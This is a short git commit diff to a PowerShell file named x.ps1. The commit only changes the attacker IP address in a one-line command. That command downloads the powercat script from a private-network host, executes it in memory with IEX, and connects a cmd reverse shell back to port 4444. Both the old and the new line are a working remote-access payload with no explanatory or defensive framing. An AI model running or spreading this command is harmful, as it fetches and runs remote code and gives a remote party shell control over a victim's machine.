890808cac12fde598ac675cf6e3bf84cf1b4ec2d
Ali Kaan Yayla <56406065+dostundegil@users.noreply.github.com>
2022-10-14 10:37:27 +0300

    Update x.ps1

--- x.ps1
+++ x.ps1
@@ -1,1 +1,1 @@
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.22/powercat.ps1');powercat -c 192.168.1.22 -p 4444 -e cmd"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.161.10/powercat.ps1');powercat -c 192.168.161.10 -p 4444 -e cmd"
